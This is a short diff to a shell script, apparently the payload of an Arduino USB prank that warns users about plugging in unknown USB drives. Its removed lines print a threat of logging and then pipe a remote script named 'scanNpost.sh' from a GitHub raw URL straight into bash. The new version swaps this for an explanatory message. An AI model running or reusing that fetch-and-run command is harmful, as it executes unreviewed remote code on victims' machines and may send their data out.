@@ -23,6 +23,5 @@ echo ""
 echo ""
 
 echo "Listen. Don't plug random USBs into your computer. This could steal your info or worse, damage your PC entirely."
-echo "Now, if you don't want to be logged, plug this USB out NOW."
-sleep 2 
-curl -sL https://raw.githubusercontent.com/glitchy-m/SHScripts/refs/heads/main/scanNpost.sh | bash -s raw.githubusercontent.com
+echo ""
+echo "This script was pulled from the internet. This Arduino does NOT have to be reprogrammed to change its payload."
